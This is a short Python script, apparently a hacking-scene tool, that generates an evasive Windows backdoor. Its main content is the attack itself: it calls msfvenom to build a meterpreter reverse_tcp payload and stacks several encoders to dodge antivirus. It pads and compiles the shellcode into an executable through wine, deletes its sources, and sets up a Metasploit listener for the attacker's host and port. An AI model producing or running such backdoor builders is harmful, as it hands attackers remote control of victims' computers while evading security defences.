#!/usr/bin/python
#Coded By M0NST4R
#Alteram o que quiserem
#Nem vou me doer por 10 minutos codando isso, vlw flw

import random
from os import system
from os import getcwd
from commands import getoutput
from time import sleep
import string
import sys

path = getcwd()
br1 = str(random.randrange(19))
br2 = str(random.randrange(19))
br3 = str(random.randrange(19))
key = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(2048))
#1512

print """
 ____ ____ ____ ____ ____ ____ ____ Coded By M0NST4R
||C |||n |||c |||B |||a |||s |||h || Merry Christmas! :3
||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
             Greatz
Cypher - SecDet - B43L - Stealth - Plastyne - Junin - My All Friends


                                                          """

filen = raw_input("Paylod name: ")

lhostn = raw_input("LHOST: ")

lportn = raw_input("LPORT: ")

print "Loading Paylod..."

system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+lhostn+" LPORT="+lportn+" -f raw -e x86/shikata_ga_nai -i "+br1+" | msfvenom  -a x86 --platform windows -e x86/fnstenv_mov -i "+br2+" | msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i "+br3+" -f c > coisa.c")

bad_words = ['unsigned char buf[] = ']

with open('coisa.c') as oldfile, open('new.c', 'w') as newfile:
    for line in oldfile:
        if not any(bad_word in line for bad_word in bad_words):
            newfile.write(line)

b = getoutput("cat new.c")

print "[ + ] Creating backdoor... [ + ]"
sleep(0.5)
f = open(''+filen+'.c','w')
f.write('unsigned char padding[]=\n')
f.write('"'+key+'";\n')
f.write('\n')
f.write('unsigned char buf[] =\n')
f.write(''+b+'\n')
f.write('\n')
f.write('\n')
f.write('int main(void) { ((void (*)())buf)();}\n')
f.close()
system("clear")
print "[ + ] Compilation the backdoor.. [ + ]"
sleep(0.5)
system("cd /root/.wine/drive_c/MinGW/bin/ && wine gcc.exe "+path+"/"+filen+".c -o "+path+"/"+filen+".exe")
sleep(0.5)
system("clear")
system("rm -rf *.c") #For save files comment this line
print "File Encrypt ==> %s.exe" % filen
sleep(0.6)
print "Payload ==> windows/meterpreter/reverse_tcp"
sleep(0.3)
print "LHOST ==> %s" % lhostn
sleep(0.3)
print "LPORT ==> %s" % lportn
sleep(0.3)
listener = raw_input("Listener Y/n: ")
if listener == "Y":
    l = open('listener.rb','w')
    l.write('#By M0NST4R\n')
    l.write('# Script for automatize listener\n')
    l.write('\n')
    l.write('use exploit/multi/handler\n')	 
    l.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    l.write('use exploit/multi/handler\n')
    l.write('set LHOST '+lhostn+'\n')
    l.write('set LPORT '+lportn+'\n')
    l.write('\n')
    l.write('exploit\n')
    l.write('\n')
    l.write('exit -y\n')
    l.close()
    system("msfconsole -r listener.rb")
    system("rm -rf listener.rb")
    system("clear")
else:    
    sys.exit(1)
